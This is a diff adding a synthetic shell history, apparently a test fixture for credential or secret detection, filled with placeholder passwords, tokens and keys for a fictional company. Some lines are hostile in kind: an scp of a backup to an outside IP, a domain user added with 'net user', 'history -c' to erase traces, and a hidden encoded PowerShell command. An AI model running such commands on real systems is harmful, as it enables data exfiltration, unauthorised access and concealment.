@@ -1,0 +1,23 @@
+#1697270072
+mysql -u root -pS3cr3tRoot -h db-prod-02.fakecorp.local crm
+mysql --user=lea.moreau --password='Winter 2026!' -e 'show databases'
+export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+export AWS_ACCESS_KEY_ID={{AKIA}}IOSFODNN7EXAMPLE
+sshpass -p 'Winter2026!' ssh lea.moreau@10.30.1.20
+curl -H "Authorization: Bearer {{ghp}}a1B2c3D4e5F6g7H8i9J0kLmNoPqRsTuVwXyZ" https://api.github.com/user
+git clone https://lea.moreau:{{ghp}}a1B2c3D4e5F6g7H8i9J0kLmNoPqRsTuVwXyZ@github.com/fakecorp/crm.git
+scp backup.tgz sobrien@185.199.108.153:/srv/backups/
+echo "Winter2026!" | sudo -S apt update
+openssl enc -aes-256-cbc -salt -in secrets.txt -out secrets.enc -k "MyKey2026"
+htpasswd -b /etc/nginx/.htpasswd lea.moreau Pa55w0rd!
+docker login registry.fakecorp.org -u lea.moreau -p 'Pa55w0rd!'
+psql "postgresql://app_crm:Pg-S3cret@db-prod-02.fakecorp.local:5432/crm"
+ssh-keygen -t ed25519 -C "lea.moreau@fakecorp.org" -f ~/.ssh/id_ed25519
+wget --user=lea.moreau --password=Pa55w0rd! http://intranet.fakecorp.local/export.csv
+ldapsearch -x -D "cn=admin,dc=fakecorp,dc=org" -w S3cr3tLdap -H ldap://10.30.1.9 "(mail=lea.moreau@fakecorp.org)"
+net user jb.delafontaine P@ssw0rd123! /add /domain
+ls -la /home/lea.moreau/ && cd /var/log
+history -c
+Invoke-WebRequest -Uri https://api.example.net/v1 -Credential (New-Object PSCredential('FAKECORP\lea.moreau',(ConvertTo-SecureString 'Pa55w0rd!' -AsPlainText -Force)))
+powershell -NoP -W Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==
+echo -----BEGIN OPENSSH {{PRIVATE_KEY}}----- > /tmp/k && echo b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW Qy > /tmp/k
